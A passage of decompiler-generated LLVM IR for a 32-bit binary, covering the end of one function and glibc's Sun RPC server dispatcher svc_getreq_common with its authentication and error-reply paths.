  %eax.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8056349 = load i32, i32* @edi, align 4
  %v0_805634a = load i32, i32* @eax, align 4
  store i32 %v0_805634a, i32* @edi, align 4
  %v0_805634c = load i32, i32* @esi, align 4
  %v0_805634d = load i32, i32* @ecx, align 4
  store i32 %v0_805634d, i32* @esi, align 4
  %v0_805634f = load i32, i32* @ebx, align 4
  store i32 %v0_805634f, i32* %stack_var_-12, align 4
  %v0_8056350 = load i32, i32* @edx, align 4
  store i32 %v0_8056350, i32* @ebx, align 4
  %v1_8056352 = call i32 @__rpc_thread_variables(i32 %v0_805634f)
  store i32 %v1_8056352, i32* %eax.global-to-local, align 4
  %v1_8056359 = add i32 %v1_8056352, 184
  %storemerge.in1 = inttoptr i32 %v1_8056359 to i32*
  %storemerge2 = load i32, i32* %storemerge.in1, align 4
  store i32 %storemerge2, i32* %eax.global-to-local, align 4
  %v1_805636f3 = icmp eq i32 %storemerge2, 0
  %v1_805637110 = icmp eq i1 %v1_805636f3, false
  br i1 %v1_805637110, label %dec_label_pc_8056361.lr.ph, label %dec_label_pc_8056373

dec_label_pc_8056361.lr.ph:                       ; preds = %entry
  %v4_8056361.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8056361

dec_label_pc_8056361:                             ; preds = %dec_label_pc_8056361.lr.ph, %dec_label_pc_805636b
  %v0_805637314 = phi i32 [ 0, %dec_label_pc_8056361.lr.ph ], [ %v0_805636b, %dec_label_pc_805636b ]
  %v0_805636b = phi i32 [ %storemerge2, %dec_label_pc_8056361.lr.ph ], [ %storemerge, %dec_label_pc_805636b ]
  %v1_8056361 = add i32 %v0_805636b, 4
  %v2_8056361 = inttoptr i32 %v1_8056361 to i32*
  %v3_8056361 = load i32, i32* %v2_8056361, align 4
  %v15_8056361 = icmp eq i32 %v3_8056361, %v4_8056361.pre
  %v1_8056364 = icmp eq i1 %v15_8056361, false
  br i1 %v1_8056364, label %dec_label_pc_805636b, label %dec_label_pc_8056366

dec_label_pc_8056366:                             ; preds = %dec_label_pc_8056361
  %v1_8056366 = add i32 %v0_805636b, 8
  %v2_8056366 = inttoptr i32 %v1_8056366 to i32*
  %v3_8056366 = load i32, i32* %v2_8056366, align 4
  %v4_8056366 = load i32, i32* @ebx, align 4
  %v15_8056366 = icmp eq i32 %v3_8056366, %v4_8056366
  br i1 %v15_8056366, label %dec_label_pc_8056366.dec_label_pc_8056373_crit_edge, label %dec_label_pc_805636b

dec_label_pc_805636b:                             ; preds = %dec_label_pc_8056366, %dec_label_pc_8056361
  %storemerge.in = inttoptr i32 %v0_805636b to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v1_805636f = icmp eq i32 %storemerge, 0
  %v1_8056371 = icmp eq i1 %v1_805636f, false
  br i1 %v1_8056371, label %dec_label_pc_8056361, label %dec_label_pc_805636f.dec_label_pc_8056373_crit_edge

dec_label_pc_8056366.dec_label_pc_8056373_crit_edge: ; preds = %dec_label_pc_8056366
  br label %dec_label_pc_8056373

dec_label_pc_805636f.dec_label_pc_8056373_crit_edge: ; preds = %dec_label_pc_805636b
  br label %dec_label_pc_8056373

dec_label_pc_8056373:                             ; preds = %dec_label_pc_805636f.dec_label_pc_8056373_crit_edge, %dec_label_pc_8056366.dec_label_pc_8056373_crit_edge, %entry
  %v0_8056373 = phi i32 [ %v0_805636b, %dec_label_pc_805636f.dec_label_pc_8056373_crit_edge ], [ %v0_805637314, %dec_label_pc_8056366.dec_label_pc_8056373_crit_edge ], [ 0, %entry ]
  %v1_8056373 = load i32, i32* @esi, align 4
  %v2_8056373 = inttoptr i32 %v1_8056373 to i32*
  store i32 %v0_8056373, i32* %v2_8056373, align 4
  %v2_8056375 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8056375, i32* @ebx, align 4
  store i32 %v0_805634c, i32* @esi, align 4
  store i32 %v0_8056349, i32* @edi, align 4
  %v0_8056378 = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_8056378

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v0_805636b, { 0, 2, 3, 4, 1 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_8056361, { 1, 0 }
}

define i32 @svc_getreq_common(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-896 = alloca i32, align 4
  %stack_var_-1296 = alloca i32, align 4
  %v4_8056387 = ptrtoint i32* %stack_var_-1296 to i32
  %v2_805638e = ptrtoint i32* %stack_var_-896 to i32
  store i32 %v2_805638e, i32* %eax.global-to-local, align 4
  %v1_805639c = call i32 @__rpc_thread_variables(i32 %v4_8056387)
  store i32 %v1_805639c, i32* %eax.global-to-local, align 4
  store i32 %v1_805639c, i32* %ebp.global-to-local, align 4
  %v1_80563a3 = add i32 %v1_805639c, 180
  %v2_80563a3 = inttoptr i32 %v1_80563a3 to i32*
  %v3_80563a3 = load i32, i32* %v2_80563a3, align 4
  store i32 %v3_80563a3, i32* @edx, align 4
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v2_80563b0 = mul i32 %arg1, 4
  %v3_80563b0 = add i32 %v3_80563a3, %v2_80563b0
  %v4_80563b0 = inttoptr i32 %v3_80563b0 to i32*
  %v5_80563b0 = load i32, i32* %v4_80563b0, align 4
  store i32 %v5_80563b0, i32* @ebx, align 4
  %v1_80563b3 = icmp eq i32 %v5_80563b0, 0
  br i1 %v1_80563b3, label %entry.dec_label_pc_805650b_crit_edge, label %dec_label_pc_80563bb.preheader

entry.dec_label_pc_805650b_crit_edge:             ; preds = %entry
  %v0_805650b.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805650b

dec_label_pc_80563bb.preheader:                   ; preds = %entry
  %v1_80563bd = add i32 %v5_80563b0, 8
  %v2_80563bd = inttoptr i32 %v1_80563bd to i32*
  %v3_8056428 = bitcast i32* %stack_var_-896 to i16*
  %v1_80563bb.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80563bb

dec_label_pc_80563bb:                             ; preds = %dec_label_pc_80563bb.preheader, %dec_label_pc_8056504
  %v1_80563bb = phi i32 [ %v1_80563bb.pre, %dec_label_pc_80563bb.preheader ], [ %v1_80564ee, %dec_label_pc_8056504 ]
  %v0_80563bb = phi i32 [ %arg1, %dec_label_pc_80563bb.preheader ], [ 0, %dec_label_pc_8056504 ]
  %v2_80563bb = add i32 %v1_80563bb, -4
  %v3_80563bb = inttoptr i32 %v2_80563bb to i32*
  store i32 %v0_80563bb, i32* %v3_80563bb, align 4
  %v0_80563bc = load i32, i32* %eax.global-to-local, align 4
  %v2_80563bc = add i32 %v1_80563bb, -8
  %v3_80563bc = inttoptr i32 %v2_80563bc to i32*
  store i32 %v0_80563bc, i32* %v3_80563bc, align 4
  %v3_80563bd = load i32, i32* %v2_80563bd, align 4
  store i32 %v3_80563bd, i32* %eax.global-to-local, align 4
  %v1_80563c0 = add i32 %v1_80563bb, 1212
  store i32 %v1_80563c0, i32* @esi, align 4
  %v2_80563c7 = add i32 %v1_80563bb, -12
  %v3_80563c7 = inttoptr i32 %v2_80563c7 to i32*
  store i32 %v1_80563c0, i32* %v3_80563c7, align 4
  %v2_80563c8 = add i32 %v1_80563bb, -16
  %v3_80563c8 = inttoptr i32 %v2_80563c8 to i32*
  store i32 %v5_80563b0, i32* %v3_80563c8, align 4
  %v1_80563c9 = add i32 %v1_80563bb, -20
  %v2_80563c9 = inttoptr i32 %v1_80563c9 to i32*
  store i32 134570955, i32* %v2_80563c9, align 4
  %v4_80563c9 = inttoptr i32 %v3_80563bd to i32*
  %v5_80563c9 = load i32, i32* %v4_80563c9, align 4
  call void @__pseudo_call(i32 %v5_80563c9)
  %v0_80563cb = load i32, i32* @esp, align 4
  %v1_80563ce = icmp eq i32 %v3_80563bd, 0
  br i1 %v1_80563ce, label %dec_label_pc_80564e4, label %dec_label_pc_80563d6

dec_label_pc_80563d6:                             ; preds = %dec_label_pc_80563bb
  %v1_80563d6 = add i32 %v0_80563cb, 828
  store i32 %v1_80563d6, i32* %eax.global-to-local, align 4
  %v1_80563dd = add i32 %v0_80563cb, 1288
  store i32 %v1_80563dd, i32* %edx.global-to-local, align 4
  %v2_80563e4 = add i32 %v0_80563cb, 1300
  %v3_80563e4 = inttoptr i32 %v2_80563e4 to i32*
  store i32 %v1_80563d6, i32* %v3_80563e4, align 4
  %v0_80563eb = load i32, i32* @esp, align 4
  %v1_80563eb = add i32 %v0_80563eb, 1224
  %v2_80563eb = inttoptr i32 %v1_80563eb to i32*
  %v3_80563eb = load i32, i32* %v2_80563eb, align 4
  store i32 %v3_80563eb, i32* %eax.global-to-local, align 4
  %v2_80563f2 = add i32 %v0_80563eb, 1260
  %v3_80563f2 = inttoptr i32 %v2_80563f2 to i32*
  store i32 %v3_80563eb, i32* %v3_80563f2, align 4
  %v0_80563f9 = load i32, i32* @esp, align 4
  %v1_80563f9 = add i32 %v0_80563f9, 1228
  %v2_80563f9 = inttoptr i32 %v1_80563f9 to i32*
  %v3_80563f9 = load i32, i32* %v2_80563f9, align 4
  store i32 %v3_80563f9, i32* %eax.global-to-local, align 4
  %v2_8056400 = add i32 %v0_80563f9, 1264
  %v3_8056400 = inttoptr i32 %v2_8056400 to i32*
  store i32 %v3_80563f9, i32* %v3_8056400, align 4
  %v0_8056407 = load i32, i32* @esp, align 4
  %v1_8056407 = add i32 %v0_8056407, 1232
  %v2_8056407 = inttoptr i32 %v1_8056407 to i32*
  %v3_8056407 = load i32, i32* %v2_8056407, align 4
  %v2_805640e = add i32 %v0_8056407, 1268
  %v3_805640e = inttoptr i32 %v2_805640e to i32*
  store i32 %v3_8056407, i32* %v3_805640e, align 4
  %v0_8056415 = load i32, i32* @esp, align 4
  %v1_8056415 = add i32 %v0_8056415, 1236
  store i32 %v1_8056415, i32* %eax.global-to-local, align 4
  %v2_805641c = add i32 %v0_8056415, 1288
  %v3_805641c = inttoptr i32 %v2_805641c to i32*
  store i32 %v5_80563b0, i32* %v3_805641c, align 4
  %v0_8056423 = load i32, i32* @edi, align 4
  %v1_8056423 = load i32, i32* @esp, align 4
  %v2_8056423 = add i32 %v1_8056423, -4
  %v3_8056423 = inttoptr i32 %v2_8056423 to i32*
  store i32 %v0_8056423, i32* %v3_8056423, align 4
  %v1_8056424 = add i32 %v1_8056423, -8
  %v2_8056424 = inttoptr i32 %v1_8056424 to i32*
  store i32 12, i32* %v2_8056424, align 4
  %v0_8056426 = load i32, i32* %eax.global-to-local, align 4
  %v2_8056426 = add i32 %v1_8056423, -12
  %v3_8056426 = inttoptr i32 %v2_8056426 to i32*
  store i32 %v0_8056426, i32* %v3_8056426, align 4
  %v0_8056427 = load i32, i32* %edx.global-to-local, align 4
  %v2_8056427 = add i32 %v1_8056423, -16
  %v3_8056427 = inttoptr i32 %v2_8056427 to i32*
  store i32 %v0_8056427, i32* %v3_8056427, align 4
  %v4_8056428 = call i32 @memcpy(i16* %v3_8056428, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8056428, i32* %eax.global-to-local, align 4
  %v0_805642d = load i32, i32* @esp, align 4
  %v1_8056430 = add i32 %v0_805642d, 1252
  %v2_8056430 = inttoptr i32 %v1_8056430 to i32*
  %v3_8056430 = load i32, i32* %v2_8056430, align 4
  %v4_8056430 = icmp eq i32 %v3_8056430, 0
  %v1_8056438 = icmp eq i1 %v4_8056430, false
  br i1 %v1_8056438, label %dec_label_pc_8056459, label %dec_label_pc_805643a

dec_label_pc_805643a:                             ; preds = %dec_label_pc_80563d6
  %v1_805643a = add i32 %v0_805642d, 1304
  %v2_805643a = inttoptr i32 %v1_805643a to i32*
  %v3_805643a = load i32, i32* %v2_805643a, align 4
  store i32 %v3_805643a, i32* %edx.global-to-local, align 4
  %v0_8056441 = load i32, i32* @global_var_8067a80.299, align 128
  store i32 %v0_8056441, i32* %eax.global-to-local, align 4
  %v2_8056446 = add i32 %v3_805643a, 32
  %v3_8056446 = inttoptr i32 %v2_8056446 to i32*
  store i32 %v0_8056441, i32* %v3_8056446, align 4
  %v0_8056449 = load i32, i32* @esp, align 4
  %v1_8056449 = add i32 %v0_8056449, 1288
  %v2_8056449 = inttoptr i32 %v1_8056449 to i32*
  %v3_8056449 = load i32, i32* %v2_8056449, align 4
  store i32 %v3_8056449, i32* %eax.global-to-local, align 4
  %v1_8056450 = add i32 %v3_8056449, 40
  %v2_8056450 = inttoptr i32 %v1_8056450 to i32*
  store i32 0, i32* %v2_8056450, align 4
  br label %dec_label_pc_805647b

dec_label_pc_8056459:                             ; preds = %dec_label_pc_80563d6
  %v0_8056459 = load i32, i32* @ecx, align 4
  %v2_8056459 = add i32 %v0_805642d, 12
  %v3_8056459 = inttoptr i32 %v2_8056459 to i32*
  store i32 %v0_8056459, i32* %v3_8056459, align 4
  %v0_805645a = load i32, i32* @ecx, align 4
  %v2_805645a = add i32 %v0_805642d, 8
  %v3_805645a = inttoptr i32 %v2_805645a to i32*
  store i32 %v0_805645a, i32* %v3_805645a, align 4
  %v0_805645b = load i32, i32* @esi, align 4
  %v2_805645b = add i32 %v0_805642d, 4
  %v3_805645b = inttoptr i32 %v2_805645b to i32*
  store i32 %v0_805645b, i32* %v3_805645b, align 4
  %v1_805645c = add i32 %v0_805642d, 1276
  store i32 %v1_805645c, i32* %eax.global-to-local, align 4
  %v3_8056463 = inttoptr i32 %v0_805642d to i32*
  store i32 %v1_805645c, i32* %v3_8056463, align 4
  %v0_8056464 = call i32 @_authenticate()
  store i32 %v0_8056464, i32* %eax.global-to-local, align 4
  %v0_8056469 = load i32, i32* @esp, align 4
  %v1_805646c = icmp eq i32 %v0_8056464, 0
  br i1 %v1_805646c, label %dec_label_pc_805647b, label %dec_label_pc_8056470

dec_label_pc_8056470:                             ; preds = %dec_label_pc_8056459
  %v0_8056470 = load i32, i32* @edx, align 4
  %v2_8056470 = add i32 %v0_8056469, 12
  %v3_8056470 = inttoptr i32 %v2_8056470 to i32*
  store i32 %v0_8056470, i32* %v3_8056470, align 4
  %v0_8056471 = load i32, i32* @edx, align 4
  %v2_8056471 = add i32 %v0_8056469, 8
  %v3_8056471 = inttoptr i32 %v2_8056471 to i32*
  store i32 %v0_8056471, i32* %v3_8056471, align 4
  %v0_8056472 = load i32, i32* %eax.global-to-local, align 4
  %v2_8056472 = add i32 %v0_8056469, 4
  %v3_8056472 = inttoptr i32 %v2_8056472 to i32*
  store i32 %v0_8056472, i32* %v3_8056472, align 4
  %v3_8056473 = inttoptr i32 %v0_8056469 to i32*
  store i32 %v5_80563b0, i32* %v3_8056473, align 4
  %v2_8056474 = call i32 @svcerr_auth(i32 %v2_805638e, i32 ptrtoint (i32* @0 to i32))
  store i32 %v2_8056474, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80564e1

dec_label_pc_805647b:                             ; preds = %dec_label_pc_8056459, %dec_label_pc_805643a
  %v0_805647b = load i32, i32* %ebp.global-to-local, align 4
  %v1_805647b = add i32 %v0_805647b, 184
  %v2_805647b = inttoptr i32 %v1_805647b to i32*
  %v3_805647b = load i32, i32* %v2_805647b, align 4
  store i32 %v3_805647b, i32* @edx, align 4
  store i32 -1, i32* @edi, align 4
  store i32 0, i32* @esi, align 4
  store i32 0, i32* @ecx, align 4
  %v1_80564b53 = icmp eq i32 %v3_805647b, 0
  %v1_80564b710 = icmp eq i1 %v1_80564b53, false
  br i1 %v1_80564b710, label %dec_label_pc_805648a.lr.ph, label %dec_label_pc_80564b9.thread

dec_label_pc_80564b9.thread:                      ; preds = %dec_label_pc_805647b
  %v0_80564d8.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80564d8

dec_label_pc_805648a.lr.ph:                       ; preds = %dec_label_pc_805647b
  %v1_805648d.pre = load i32, i32* @esp, align 4
  %v2_805648d = add i32 %v1_805648d.pre, 1260
  %v3_805648d = inttoptr i32 %v2_805648d to i32*
  %v2_8056499 = add i32 %v1_805648d.pre, 1264
  %v3_8056499 = inttoptr i32 %v2_8056499 to i32*
  br label %dec_label_pc_805648a

dec_label_pc_805648a:                             ; preds = %dec_label_pc_805648a.lr.ph, %dec_label_pc_80564b3
  %v0_80564b923 = phi i32 [ 0, %dec_label_pc_805648a.lr.ph ], [ %v0_80564b922, %dec_label_pc_80564b3 ]
  %v0_80564c8 = phi i32 [ 0, %dec_label_pc_805648a.lr.ph ], [ %v1_80564ad20, %dec_label_pc_80564b3 ]
  %v0_80564a2 = phi i32 [ -1, %dec_label_pc_805648a.lr.ph ], [ %v0_80564a217, %dec_label_pc_80564b3 ]
  %v0_80564b3 = phi i32 [ %v3_805647b, %dec_label_pc_805648a.lr.ph ], [ %v2_80564b3, %dec_label_pc_80564b3 ]
  %v1_805648a = add i32 %v0_80564b3, 4
  %v2_805648a = inttoptr i32 %v1_805648a to i32*
  %v3_805648a = load i32, i32* %v2_805648a, align 4
  store i32 %v3_805648a, i32* %eax.global-to-local, align 4
  %v4_805648d = load i32, i32* %v3_805648d, align 4
  %v15_805648d = icmp eq i32 %v3_805648a, %v4_805648d
  %v1_8056494 = icmp eq i1 %v15_805648d, false
  br i1 %v1_8056494, label %dec_label_pc_80564b3, label %dec_label_pc_8056496

dec_label_pc_8056496:                             ; preds = %dec_label_pc_805648a
  %v1_8056496 = add i32 %v0_80564b3, 8
  %v2_8056496 = inttoptr i32 %v1_8056496 to i32*
  %v3_8056496 = load i32, i32* %v2_8056496, align 4
  store i32 %v3_8056496, i32* %eax.global-to-local, align 4
  %v4_8056499 = load i32, i32* %v3_8056499, align 4
  %v15_8056499 = icmp eq i32 %v3_8056496, %v4_8056499
  br i1 %v15_8056499, label %dec_label_pc_80564c8, label %dec_label_pc_80564a2

dec_label_pc_80564a2:                             ; preds = %dec_label_pc_8056496
  %tmp36 = icmp ugt i32 %v0_80564a2, %v3_8056496
  br i1 %tmp36, label %dec_label_pc_80564a6, label %dec_label_pc_80564a8

dec_label_pc_80564a6:                             ; preds = %dec_label_pc_80564a2
  store i32 %v3_8056496, i32* @edi, align 4
  br label %dec_label_pc_80564a8

dec_label_pc_80564a8:                             ; preds = %dec_label_pc_80564a2, %dec_label_pc_80564a6
  %v0_80564a218 = phi i32 [ %v0_80564a2, %dec_label_pc_80564a2 ], [ %v3_8056496, %dec_label_pc_80564a6 ]
  store i32 1, i32* @ecx, align 4
  %tmp37 = icmp ugt i32 %v3_8056496, %v0_80564c8
  br i1 %tmp37, label %dec_label_pc_80564b1, label %dec_label_pc_80564b3

dec_label_pc_80564b1:                             ; preds = %dec_label_pc_80564a8
  store i32 %v3_8056496, i32* @esi, align 4
  br label %dec_label_pc_80564b3

dec_label_pc_80564b3:                             ; preds = %dec_label_pc_80564a8, %dec_label_pc_805648a, %dec_label_pc_80564b1
  %v0_80564bd = phi i32 [ %v3_8056496, %dec_label_pc_80564a8 ], [ %v3_805648a, %dec_label_pc_805648a ], [ %v3_8056496, %dec_label_pc_80564b1 ]
  %v1_80564ad20 = phi i32 [ %v0_80564c8, %dec_label_pc_80564a8 ], [ %v0_80564c8, %dec_label_pc_805648a ], [ %v3_8056496, %dec_label_pc_80564b1 ]
  %v0_80564b922 = phi i32 [ 1, %dec_label_pc_80564a8 ], [ %v0_80564b923, %dec_label_pc_805648a ], [ 1, %dec_label_pc_80564b1 ]
  %v0_80564a217 = phi i32 [ %v0_80564a218, %dec_label_pc_80564a8 ], [ %v0_80564a2, %dec_label_pc_805648a ], [ %v0_80564a218, %dec_label_pc_80564b1 ]
  %v1_80564b3 = inttoptr i32 %v0_80564b3 to i32*
  %v2_80564b3 = load i32, i32* %v1_80564b3, align 4
  store i32 %v2_80564b3, i32* @edx, align 4
  %v1_80564b5 = icmp eq i32 %v2_80564b3, 0
  %v1_80564b7 = icmp eq i1 %v1_80564b5, false
  br i1 %v1_80564b7, label %dec_label_pc_805648a, label %dec_label_pc_80564b9

dec_label_pc_80564b9:                             ; preds = %dec_label_pc_80564b3
  %v1_80564b9 = icmp eq i32 %v0_80564b922, 0
  br i1 %v1_80564b9, label %dec_label_pc_80564d8, label %dec_label_pc_80564bd

dec_label_pc_80564bd:                             ; preds = %dec_label_pc_80564b9
  %v2_80564bd = add i32 %v1_805648d.pre, -4
  %v3_80564bd = inttoptr i32 %v2_80564bd to i32*
  store i32 %v0_80564bd, i32* %v3_80564bd, align 4
  %v0_80564be = load i32, i32* @esi, align 4
  %v2_80564be = add i32 %v1_805648d.pre, -8
  %v3_80564be = inttoptr i32 %v2_80564be to i32*
  store i32 %v0_80564be, i32* %v3_80564be, align 4
  %v0_80564bf = load i32, i32* @edi, align 4
  %v2_80564bf = add i32 %v1_805648d.pre, -12
  %v3_80564bf = inttoptr i32 %v2_80564bf to i32*
  store i32 %v0_80564bf, i32* %v3_80564bf, align 4
  %v2_80564c0 = add i32 %v1_805648d.pre, -16
  %v3_80564c0 = inttoptr i32 %v2_80564c0 to i32*
  store i32 %v5_80563b0, i32* %v3_80564c0, align 4
  %v0_80564c1 = call i32 @svcerr_progvers()
  store i32 %v0_80564c1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80564e1

dec_label_pc_80564c8:                             ; preds = %dec_label_pc_8056496
  %v2_80564c8 = add i32 %v1_805648d.pre, -4
  %v3_80564c8 = inttoptr i32 %v2_80564c8 to i32*
  store i32 %v0_80564c8, i32* %v3_80564c8, align 4
  %v0_80564c9 = load i32, i32* @esi, align 4
  %v2_80564c9 = add i32 %v1_805648d.pre, -8
  %v3_80564c9 = inttoptr i32 %v2_80564c9 to i32*
  store i32 %v0_80564c9, i32* %v3_80564c9, align 4
  %v2_80564ca = add i32 %v1_805648d.pre, -12
  %v3_80564ca = inttoptr i32 %v2_80564ca to i32*
  store i32 %v5_80563b0, i32* %v3_80564ca, align 4
  store i32 %v2_805648d, i32* %eax.global-to-local, align 4
  %v2_80564d2 = add i32 %v1_805648d.pre, -16
  %v3_80564d2 = inttoptr i32 %v2_80564d2 to i32*
  store i32 %v2_805648d, i32* %v3_80564d2, align 4
  %v1_80564d3 = add i32 %v1_805648d.pre, -20
  %v2_80564d3 = inttoptr i32 %v1_80564d3 to i32*
  store i32 134571222, i32* %v2_80564d3, align 4
  %v3_80564d3 = load i32, i32* @edx, align 4
  %v4_80564d3 = add i32 %v3_80564d3, 12
  %v5_80564d3 = inttoptr i32 %v4_80564d3 to i32*
  %v6_80564d3 = load i32, i32* %v5_80564d3, align 4
  call void @__pseudo_call(i32 %v6_80564d3)
  br label %dec_label_pc_80564e1

dec_label_pc_80564d8:                             ; preds = %dec_label_pc_80564b9.thread, %dec_label_pc_80564b9
  %v0_80564d8 = phi i32 [ %v0_80564d8.pre, %dec_label_pc_80564b9.thread ], [ %v1_805648d.pre, %dec_label_pc_80564b9 ]
  %v2_80564db = add i32 %v0_80564d8, -16
  %v3_80564db = inttoptr i32 %v2_80564db to i32*
  store i32 %v5_80563b0, i32* %v3_80564db, align 4
  %v0_80564dc = call i32 @__GI_svcerr_noprog()
  store i32 %v0_80564dc, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80564e1

dec_label_pc_80564e1:                             ; preds = %dec_label_pc_80564c8, %dec_label_pc_80564bd, %dec_label_pc_8056470, %dec_label_pc_80564d8
  %v0_80564e1 = load i32, i32* @esp, align 4
  br label %dec_label_pc_80564e4

dec_label_pc_80564e4:                             ; preds = %dec_label_pc_80563bb, %dec_label_pc_80564e1
  %v0_80564e4.in = phi i32 [ %v0_80563cb, %dec_label_pc_80563bb ], [ %v0_80564e1, %dec_label_pc_80564e1 ]
  %v3_80564e7 = load i32, i32* %v2_80563bd, align 4
  store i32 %v3_80564e7, i32* %eax.global-to-local, align 4
  %v3_80564ea = inttoptr i32 %v0_80564e4.in to i32*
  store i32 %v5_80563b0, i32* %v3_80564ea, align 4
  %v1_80564eb = add i32 %v0_80564e4.in, -4
  %v2_80564eb = inttoptr i32 %v1_80564eb to i32*
  store i32 134571246, i32* %v2_80564eb, align 4
  %v4_80564eb = add i32 %v3_80564e7, 4
  %v5_80564eb = inttoptr i32 %v4_80564eb to i32*
  %v6_80564eb = load i32, i32* %v5_80564eb, align 4
  call void @__pseudo_call(i32 %v6_80564eb)
  %v0_80564ee = load i32, i32* @esp, align 4
  %v1_80564ee = add i32 %v0_80564ee, 16
  %v1_80564f1 = icmp eq i32 %v3_80564e7, 0
  %v1_80564f3 = icmp eq i1 %v1_80564f1, false
  br i1 %v1_80564f3, label %dec_label_pc_8056504, label %dec_label_pc_80564f5

dec_label_pc_80564f5:                             ; preds = %dec_label_pc_80564e4
  %v3_80564f8 = load i32, i32* %v2_80563bd, align 4
  store i32 %v3_80564f8, i32* %eax.global-to-local, align 4
  %v3_80564fb = inttoptr i32 %v0_80564ee to i32*
  store i32 %v5_80563b0, i32* %v3_80564fb, align 4
  %v1_80564fc = add i32 %v0_80564ee, -4
  %v2_80564fc = inttoptr i32 %v1_80564fc to i32*
  store i32 134571263, i32* %v2_80564fc, align 4
  %v3_80564fc = load i32, i32* %eax.global-to-local, align 4
  %v4_80564fc = add i32 %v3_80564fc, 20
  %v5_80564fc = inttoptr i32 %v4_80564fc to i32*
  %v6_80564fc = load i32, i32* %v5_80564fc, align 4
  call void @__pseudo_call(i32 %v6_80564fc)
  %v0_80564ff = load i32, i32* @esp, align 4
  %v1_80564ff = add i32 %v0_80564ff, 16
  %v0_8056515.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805650b

dec_label_pc_8056504:                             ; preds = %dec_label_pc_80564e4
  %v1_8056504 = add i32 %v3_80564e7, -1
  %v8_8056504 = icmp eq i32 %v1_8056504, 0
  store i32 %v1_8056504, i32* %eax.global-to-local, align 4
  br i1 %v8_8056504, label %dec_label_pc_80563bb, label %dec_label_pc_805650b

dec_label_pc_805650b:                             ; preds = %dec_label_pc_8056504, %entry.dec_label_pc_805650b_crit_edge, %dec_label_pc_80564f5
  %v0_8056515 = phi i32 [ %arg1, %entry.dec_label_pc_805650b_crit_edge ], [ %v0_8056515.pre, %dec_label_pc_80564f5 ], [ %v1_8056504, %dec_label_pc_8056504 ]
  %v0_805650b = phi i32 [ %v0_805650b.pre, %entry.dec_label_pc_805650b_crit_edge ], [ %v1_80564ff, %dec_label_pc_80564f5 ], [ %v1_80564ee, %dec_label_pc_8056504 ]
  %v1_805650b = add i32 %v0_805650b, 1292
  %v6_805650b = xor i32 %v0_805650b, -2147483648
  %v7_805650b = and i32 %v1_805650b, %v6_805650b
  %v8_805650b = icmp slt i32 %v7_805650b, 0
  store i1 %v8_805650b, i1* @of, align 1
  %v1_8056511 = inttoptr i32 %v1_805650b to i32*
  %v2_8056511 = load i32, i32* %v1_8056511, align 4
  store i32 %v2_8056511, i32* @ebx, align 4
  %v3_8056511 = add i32 %v0_805650b, 1296
  %v1_8056512 = inttoptr i32 %v3_8056511 to i32*
  %v2_8056512 = load i32, i32* %v1_8056512, align 4
  store i32 %v2_8056512, i32* @esi, align 4
  %v3_8056512 = add i32 %v0_805650b, 1300
  %v1_8056513 = inttoptr i32 %v3_8056512 to i32*
  %v2_8056513 = load i32, i32* %v1_8056513, align 4
  store i32 %v2_8056513, i32* @edi, align 4
  %v3_8056513 = add i32 %v0_805650b, 1304
  %v1_8056514 = inttoptr i32 %v3_8056513 to i32*
  %v2_8056514 = load i32, i32* %v1_8056514, align 4
  store i32 %v2_8056514, i32* @ebp, align 4
  ret i32 %v0_8056515

; uselistorder directives
  uselistorder i32 %v0_805650b, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_8056504, { 0, 2, 1 }
  uselistorder i32 %v3_80564e7, { 1, 2, 0, 3 }
  uselistorder i32 %v2_80564b3, { 1, 2, 0 }
  uselistorder i32 %v3_8056496, { 4, 0, 1, 3, 5, 7, 6, 8, 2, 9 }
  uselistorder i32 %v0_80564a2, { 2, 1, 0 }
  uselistorder i32 %v0_80564c8, { 0, 3, 2, 1 }
  uselistorder i32 %v2_805648d, { 1, 0, 2 }
  uselistorder i32 %v1_805648d.pre, { 0, 11, 10, 9, 8, 7, 4, 3, 2, 1, 6, 5 }
  uselistorder i32 %v0_8056469, { 3, 0, 1, 2 }
  uselistorder i32 %v0_805642d, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32 %v1_80563bb, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v5_80563b0, { 3, 4, 7, 6, 8, 0, 1, 5, 2, 9, 10 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 26, 25 }
  uselistorder i32 -2147483648, { 12, 7, 11, 4, 8, 14, 0, 1, 2, 9, 10, 3, 5, 6, 13 }
  uselistorder i32 (i32, i32)* @svcerr_auth, { 1, 0 }
  uselistorder i32 1304, { 1, 0 }
  uselistorder i32 1300, { 1, 0 }
  uselistorder i32 1288, { 1, 2, 0 }
  uselistorder i32 -20, { 5, 4, 6, 7, 0, 8, 1, 9, 10, 11, 2, 3 }
  uselistorder i32 %arg1, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_805650b, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80564e4, { 1, 0 }
  uselistorder label %dec_label_pc_80564e1, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_80564d8, { 1, 0 }
  uselistorder label %dec_label_pc_80564b3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80564a8, { 1, 0 }
